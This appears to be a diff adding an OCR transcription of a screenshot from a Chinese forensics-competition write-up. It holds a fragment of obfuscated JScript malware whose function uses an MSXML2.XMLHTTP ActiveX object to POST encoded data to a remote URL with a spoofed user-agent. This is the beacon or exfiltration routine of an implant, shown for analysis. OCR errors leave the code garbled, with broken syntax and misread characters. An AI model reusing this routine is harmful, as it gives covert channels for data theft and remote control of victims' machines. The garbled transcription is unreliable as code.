@@ -1,0 +1,12 @@
+# OCR: Pasted_image_20260414204533.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260414204533.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:43
+
+172 173 174 175 176 177 178 179 188 181 182 183 184
+functionXEWG(uxHK，hm2i)） try [
+var Kpxo = new Activexobject("MSxML2.XMLHTTp"): Kpxo.OPEN("post", uXHK, false):
+Kpxo.SETREQUESTHEADER("user-agent:","Mozi1la/5.e (Windows NT 6.1: Win64: x64):" + Sz8k()):
+Kpxo.SETREQUESTHEADER("content-type:","application/octet-stream"): varrRi3=hLit(hm2j,true):
+Kpxo.SETREQUESTHEADER("content-length:"，rRi3.length); Kpxo.SEND(rRi3):returnKpxo.responseText;
+catch (e) return
